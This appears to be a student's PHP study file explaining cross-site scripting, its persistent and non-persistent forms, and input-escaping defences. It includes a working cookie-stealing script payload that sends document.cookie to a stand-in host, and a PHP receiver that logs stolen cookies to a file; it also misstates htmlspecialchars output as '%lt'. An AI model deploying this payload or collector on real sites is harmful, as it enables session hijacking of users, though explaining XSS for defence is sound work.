<?php
	// With John being interested in some of the greyer area's of web dev
	// my money is on him asking this question but who knows.

	// XSS  also knows as Cross Site Scripting, is when oppotunistic tech savvy
	// people recognise vulnerabilities within a web app. They exploit the said vulnerabilities by 
	// injecting malicious client side code into web pages. XSS comes in two flavours:

	// # non-persistent 
	// - attack only affects user running script
	// - can indicate short comings by devs
	// - steal cookie info
	// - redirect to phising

	// # persistent
	// - persists on a website
	// - usually have malicious code stored on db
	// - this is attackers ultimate goal

	// There are a couple of ways to prevent attacks withing your own apps
	
	// 1. Validating user input to ensure it is safe to accept the data
	// 		using regular expressions
	// 		within php you can use htmlspecialchars() function (replaces < with %lt etc)

	// 2. encode all user input to help mitigate the risk of readable info being stolen

	// An example of an XSS attack might be leaving a linke in a comment on an exploitable page. Once hovered 
	// over the link the user is redirected and their cookie info is stolen by the attacker. This could 
	// allow them to log in as the user and steal even more valuable info.

	// ******** the comment on the site might look like ************ //
	// everything within the ""
	echo "<script>window.location='http://maliciouspage.com/cookiestealer.php?cookie='+escape(document.cookie)</script>";


	// ******** the redirected page might look like ************ //
	if(isset($_GET['cookie'])){
		$file = 'stolenCookies.txt';
		file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
	}

	// above I think EOL -> end of line
	
?>